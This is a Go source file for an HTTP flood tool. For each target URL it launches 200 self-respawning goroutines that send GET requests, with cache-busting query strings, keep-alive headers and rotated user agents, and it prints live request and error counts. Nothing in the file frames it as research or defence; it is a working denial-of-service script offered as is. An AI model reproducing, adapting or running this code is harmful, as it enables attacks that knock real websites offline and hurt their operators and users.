package main

import (
	"fmt"
	"github.com/gosuri/uilive"
	"math/rand"
	"net/http"
	"runtime"
	"strings"
	"time"
)

var ConcurrencyLimit = 200

type target struct {
	URl  		string
	Requests  	int
	Errors  	int
	Line  		int
	Queue  		int
}

var running []*target

var w *uilive.Writer

func request(url string) error {
	client := &http.Client{
		Timeout: time.Second * 1,
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("Got error %s", err.Error())
	}
	req.Header.Add("Connection", "Keep-Alive")
	req.Header.Add("Cache-Control", "max-age=0")
	for _, h := range strings.Split(getuseragent(), "\r\n"){
		kv := strings.Split(h, ":")
		if len(kv) == 2 {
			req.Header.Add(kv[0], kv[1])
		}
	}

	response, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Got error %s", err.Error())
	}
	defer response.Body.Close()
	return nil
}

func flood(t *target){

	for t.Queue > ConcurrencyLimit {
		time.Sleep(time.Millisecond * 1000)
	}

	t.Requests++
	randUrl := t.URl
	if t.Requests % 3 == 0 {
		randUrl += "?" + string(rand.Int() * 1000)
	}
	//_, err := http.Get(randUrl)
	err := request(randUrl)
	if err != nil {
		t.Errors++
	}
	t.Queue--
	time.Sleep(time.Millisecond * 10)
	go flood(t)
}

func main() {
	os := runtime.GOOS
	if os == "linux" {
		setLimits()
	}

	w = uilive.New()
	w.Start()
	defer w.Stop()

	for i, t := range targets {
		r := &target{URl: t, Requests: 0, Errors: 0, Line: i}
		running = append(running, r)
		for x := 1; x <= ConcurrencyLimit; x++ {
			r.Queue++
			go flood(r)
		}
	}

	for {
		_, _ = fmt.Fprintf(w, "%35s%15s%15s\n", "URL", "Requests", "Errors")
		for i, _ := range targets {
			t := *running[i]
			fmt.Fprintf(w.Newline(), "%35s%15d%15d\n", t.URl, t.Requests, t.Errors)
		}

		time.Sleep(time.Millisecond * 3000)
	}

}